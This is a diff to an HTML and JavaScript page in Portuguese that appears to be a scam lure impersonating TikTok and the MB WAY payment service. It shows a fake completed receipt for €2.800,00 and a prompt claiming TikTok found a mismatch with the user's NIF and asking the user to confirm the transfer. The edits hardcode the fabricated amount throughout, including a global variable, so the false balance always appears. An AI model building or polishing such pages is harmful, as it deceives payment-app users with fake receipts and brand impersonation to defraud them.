@@ -390,7 +390,7 @@ ttq.load('D701J2RC77UANC7P0LQ0');ttq.page();
                 <polyline points="5 13 11 19 23 7"></polyline>
             </svg>
         </div>
-        <div class="s1-amount">€ <span class="js-lead-balance-fmt"></span></div>
+        <div class="s1-amount">€ <span class="js-lead-balance-fmt">2.800,00</span></div>
         <div class="s1-desc">recebido via MB WAY</div>
         <div class="s1-badge">Concluído</div>
     </div>
@@ -444,7 +444,7 @@ ttq.load('D701J2RC77UANC7P0LQ0');ttq.page();
                 <polyline points="5 13 11 19 23 7"></polyline>
             </svg>
         </div>
-        <div class="s2-amount">€ <span class="js-lead-balance-fmt"></span></div>
+        <div class="s2-amount">€ <span class="js-lead-balance-fmt">2.800,00</span></div>
         <div class="s2-subtitle">Transferência enviada com sucesso</div>
     </div>
 
@@ -499,7 +499,7 @@ ttq.load('D701J2RC77UANC7P0LQ0');ttq.page();
 ════════════════════════════════════════════ -->
 <div id="confirmBox">
     <h3 class="cb-title">Este MB WAY é seu?</h3>
-    <p class="cb-text">O TikTok identificou que os dados da conta de <b id="cb-name"></b> não coincidem com o seu NIF. Deseja confirmar este envio de <b id="cb-amount"></b>?</p>
+    <p class="cb-text">O TikTok identificou que os dados da conta de <b id="cb-name"></b> não coincidem com o seu NIF. Deseja confirmar este envio de <b id="cb-amount">2.800,00</b>?</p>
     <button class="btn-cb-ghost">Sim, este MB WAY é meu</button>
     <button onclick="toStep3()" class="btn-cb-red">NÃO, NÃO É O MEU MB WAY!</button>
 </div>
@@ -544,6 +544,9 @@ ttq.load('D701J2RC77UANC7P0LQ0');ttq.page();
 
 
 <script>
+    // FIX: Define os valores manualmente para garantir que apareçam sempre
+    window.__LEAD_BALANCE_FMT__ = "2.800,00";
+
     function setupData() {
         var _name = (document.getElementById('pay-name') ? document.getElementById('pay-name').value : '') || 'Utilizador';
         var _el = document.getElementById('receipt-name'); if(_el) _el.textContent = _name;
@@ -563,7 +566,7 @@ ttq.load('D701J2RC77UANC7P0LQ0');ttq.page();
         window.scrollTo(0, 0);
         var _cbName = document.getElementById('pay-name') ? document.getElementById('pay-name').value : '';
         var _cbEl = document.getElementById('cb-name'); if(_cbEl) _cbEl.textContent = _cbName || 'utilizador';
-        var _cbAmt = document.getElementById('cb-amount'); if(_cbAmt) _cbAmt.textContent = '\u20ac ' + (window.__LEAD_BALANCE_FMT__||'');
+        var _cbAmt = document.getElementById('cb-amount'); if(_cbAmt) _cbAmt.textContent = '\u20ac ' + (window.__LEAD_BALANCE_FMT__||'2.800,00');
         setTimeout(function() { document.getElementById('confirmBox').classList.add('active'); }, 2500);
     }
 
